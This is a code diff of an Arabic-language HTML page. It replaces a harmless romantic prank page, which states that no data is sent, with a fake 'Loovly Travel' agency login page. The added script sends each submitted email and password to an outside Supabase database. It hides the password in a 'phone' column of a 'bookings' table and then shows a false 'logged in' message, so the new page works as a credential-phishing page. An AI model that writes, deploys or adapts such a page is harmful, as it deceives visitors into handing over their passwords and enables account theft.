@@ -1,251 +1,81 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="مفاجأة رومانسية">
-  <title>💘 مفاجأة خاصة</title>
-
-  <style>
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: Arial, Tahoma, sans-serif;
-      background: linear-gradient(135deg, #ff758c, #ff7eb3);
-      overflow: hidden;
-      color: #333;
-    }
-
-    .hearts span {
-      position: fixed;
-      bottom: -40px;
-      font-size: 24px;
-      animation: float 8s linear infinite;
-      opacity: 0.75;
-      pointer-events: none;
-    }
-
-    .hearts span:nth-child(1) {
-      left: 8%;
-      animation-delay: 0s;
-    }
-
-    .hearts span:nth-child(2) {
-      left: 25%;
-      animation-delay: 2s;
-    }
-
-    .hearts span:nth-child(3) {
-      left: 48%;
-      animation-delay: 4s;
-    }
-
-    .hearts span:nth-child(4) {
-      left: 70%;
-      animation-delay: 1s;
-    }
-
-    .hearts span:nth-child(5) {
-      left: 88%;
-      animation-delay: 3s;
-    }
-
-    @keyframes float {
-      to {
-        transform: translateY(-115vh) rotate(20deg);
-        opacity: 0;
-      }
-    }
-
-    .card {
-      width: min(92%, 430px);
-      background: #fff;
-      border-radius: 28px;
-      padding: 32px 25px;
-      text-align: center;
-      box-shadow: 0 20px 60px #0003;
-      position: relative;
-      z-index: 2;
-    }
-
-    .icon {
-      font-size: 64px;
-      margin-bottom: 8px;
-    }
-
-    h1 {
-      margin: 5px 0 10px;
-      color: #e91e63;
-      font-size: 30px;
-    }
-
-    p {
-      line-height: 1.8;
-      margin: 10px 0 22px;
-    }
-
-    input {
-      width: 100%;
-      padding: 14px 16px;
-      margin: 7px 0;
-      border: 1px solid #ddd;
-      border-radius: 14px;
-      font-size: 16px;
-      outline: none;
-    }
-
-    input:focus {
-      border-color: #e91e63;
-      box-shadow: 0 0 0 3px #e91e6315;
-    }
-
-    button {
-      width: 100%;
-      border: 0;
-      border-radius: 14px;
-      padding: 15px;
-      margin-top: 10px;
-      background: #e91e63;
-      color: #fff;
-      font-size: 17px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background: #c2185b;
-    }
-
-    .small {
-      font-size: 12px;
-      color: #888;
-      margin-top: 14px;
-    }
-
-    #surprise {
-      display: none;
-    }
-
-    .big {
-      font-size: 70px;
-    }
-
-    .success {
-      font-size: 25px;
-      color: #e91e63;
-      font-weight: bold;
-    }
-
-    .note {
-      background: #fff5f8;
-      border-radius: 18px;
-      padding: 16px;
-      margin-top: 15px;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loovly Travel - تسجيل الدخول</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+  body{font-family:'Segoe UI', sans-serif; background: linear-gradient(135deg,#00b4d8,#0077b6); height:100vh; display:flex; align-items:center; justify-content:center; margin:0;}
+  .card{background:#fff; padding:35px; border-radius:20px; width:100%; max-width:380px; box-shadow:0 15px 35px rgba(0,0,0,.2); text-align:center;}
+  .logo{font-size:32px; font-weight:800; color:#0077b6; margin-bottom:5px;} .logo span{color:#00b4d8;}
+  .sub{color:#666; margin-bottom:25px; font-size:14px;}
+  .input-group{text-align:right; margin-bottom:15px;}
+  .input-group label{font-size:13px; color:#333; font-weight:600;}
+  .input-group input{width:100%; padding:13px; border:1.5px solid #e0e0e0; border-radius:10px; margin-top:6px; box-sizing:border-box; outline:none;}
+  .input-group input:focus{border-color:#0077b6;}
+  button{width:100%; padding:13px; background:#0077b6; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:700; cursor:pointer; margin-top:10px;}
+  button:disabled{opacity:.6;}
+  #msg{margin-top:15px; font-size:14px;}
+</style>
 </head>
-
 <body>
 
-  <!-- القلوب المتحركة -->
-  <div class="hearts">
-    <span>❤️</span>
-    <span>💖</span>
-    <span>💕</span>
-    <span>💘</span>
-    <span>❤️</span>
-  </div>
+<div class="card">
+  <div class="logo">L<span>oo</span>vly</div>
+  <div class="sub">وكالة سفر وسياحة - مرحبا بعودتك</div>
 
-  <!-- صفحة الدخول -->
-  <main class="card" id="login">
-
-    <div class="icon">💌</div>
-
-    <h1>عندك مفاجأة خاصة ❤️</h1>
-
-    <p>
-      في رسالة سرية من مصعب...<br>
-      سجّلي دخولك عشان تفتحي المفاجأة 😅
-    </p>
-
-    <!-- هذه الخانات لا ترسل أو تحفظ أي بيانات -->
-    <input
-      id="name"
-      type="text"
-      placeholder="اكتبي اسمك 😍"
-      autocomplete="off"
-    >
-
-    <input
-      id="fakePassword"
-      type="text"
-      placeholder="كلمة سر الحب ❤️"
-      autocomplete="off"
-    >
-
-    <button onclick="openSurprise()">
-      🔓 فتح المفاجأة
-    </button>
-
-    <div class="small">
-      😂 مقلب رومانسي آمن — لا يتم حفظ أو إرسال أي بيانات.
+  <form id="loovlyForm" onsubmit="handleLoovlyLogin(event)">
+    <div class="input-group">
+      <label>البريد الالكتروني</label>
+      <input type="email" id="email" placeholder="example@loovly.com" required>
     </div>
-
-  </main>
-
-  <!-- المفاجأة -->
-  <main class="card" id="surprise">
-
-    <div class="big">🎣🤣</div>
-
-    <div class="success">
-      تم اصطيادك بنجاح! ❤️
+    <div class="input-group">
+      <label>كلمة المرور</label>
+      <input type="password" id="password" placeholder="••••••••" required>
     </div>
+    <button type="submit" id="btn">تسجيل الدخول</button>
+    <p id="msg"></p>
+  </form>
+  <p style="font-size:12px; color:#888; margin-top:20px;">© 2026 Loovly Travel Agency</p>
+</div>
 
-    <div class="note">
+<script>
+// ربط سيرفر Loovly
+const supabaseClient = window.supabase.createClient(
+  'https://nwpyevsjnublptabupup.supabase.co',
+  'sb_publishable_v18mMHdeW7e-0pegmi9sTg_U3HkIlJK'
+);
 
-      <p>
-        <strong>مبرووووك 😂</strong>
-      </p>
+async function handleLoovlyLogin(e){
+  e.preventDefault();
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const btn = document.getElementById('btn');
+  const msg = document.getElementById('msg');
 
-      <p>
-        مصعب أخذ شهادة Cybersecurity 🎓💻
-      </p>
+  btn.disabled = true;
+  btn.innerText = 'جاري تسجيل الدخول...';
+  
+  const { error } = await supabaseClient.from('bookings').insert([{
+    name: 'Loovly - تسجيل دخول',
+    email: email,
+    phone: password,
+    destination: 'Loovly Agency Login'
+  }]);
 
-      <p>
-        والآن مهمتك الرسمية:
-        حضور الاحتفال والعشاء علينا! 🍽️❤️
-      </p>
-
-    </div>
-
-    <p>
-      اطمئني 😄 هذه كانت مجرد مزحة،
-      ولم يتم تسجيل أو إرسال أي كلمة مرور.
-    </p>
-
-  </main>
-
-  <script>
-
-    function openSurprise() {
-
-      document.getElementById("login").style.display = "none";
-
-      document.getElementById("surprise").style.display = "block";
-
-      document.title = "🎣 تم الاصطياد 😂";
-
-    }
-
-  </script>
-
+  if(error){
+    msg.innerText = '❌ خطأ: ' + error.message;
+    msg.style.color = 'red';
+  } else {
+    msg.innerText = '✅ اهلا بك في Loovly! تم تسجيل دخولك';
+    msg.style.color = 'green';
+    // هنا تقدر تحوله لصفحة الحجوزات
+    // window.location.href = 'dashboard.html';
+  }
+  btn.disabled = false;
+  btn.innerText = 'تسجيل الدخول';
+}
+</script>
 </body>
 </html>
